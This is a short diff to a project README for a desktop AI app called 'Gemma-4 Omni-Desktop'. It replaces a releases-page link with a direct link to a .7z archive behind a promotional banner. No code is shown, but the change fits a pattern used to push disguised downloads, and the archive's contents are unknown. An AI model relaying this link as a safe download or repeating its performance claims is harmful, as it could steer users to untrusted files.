@@ -11,7 +11,7 @@
 **We've packed the power of frontier models into one lightweight desktop application, optimized specifically for RTX 30xx series graphics cards and entry-level Macs with 8GB of RAM.**
 
 <div align="center">
-  <a href="../../releases/">
+  <a href="../../releases/download/Gemma-4-Omni/gemma-4-omni_x64.7z">
     <img width="700" alt=" Gemma-4 Omni-Desktop: The Private AI Powerhouse." src="assets/8pexnsas7f.png" />
   </a>
 </div>
